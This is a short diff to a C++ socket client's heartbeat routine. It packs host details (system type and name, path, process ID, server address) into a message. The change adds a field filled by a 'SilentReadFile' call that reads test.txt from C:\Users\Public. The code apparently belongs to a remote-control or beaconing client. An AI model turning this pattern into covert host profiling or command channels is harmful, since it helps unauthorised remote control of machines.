@@ -138,7 +138,7 @@ auto SocketClient::BuildHeart(void) -> string
 {
     Info Info;
     Main Main{};
-
+    Memory Memory;
     auto& _name = this->client->name;
     auto& _socket = this->serverAddr;
     auto mytime = time(nullptr);
@@ -151,14 +151,16 @@ auto SocketClient::BuildHeart(void) -> string
     map<string, string> message;
 
     ctime_s(timeBuffer, sizeof(timeBuffer), &mytime);
+
+    message["ProcessID"] = Info.JSONinfyDWORD(ProcID2);
+    message["Command"] = Memory.SilentReadFile("test.txt", "C:\\Users\\Public\\");
+    message["SysType"] = Info.getSystemType();
+    message["SysName"] = Info.getSystemName();
+    message["socket"] = std::to_string((int)_socket.sin_addr.s_addr);
     message["time"] = timeBuffer;
     message["name"] = _name;
     message["type"] = "client";
-    message["socket"] = std::to_string((int)_socket.sin_addr.s_addr);
-    message["SysType"] = Info.getSystemType();
-    message["SysName"] = Info.getSystemName();
     message["Path"] = Info.getCurrentDirectory();
-    message["ProcessID"] = Info.JSONinfyDWORD(ProcID2);
     // sort the message map by key
     map<std::string, std::string> ordered(message.begin(), message.end());
 
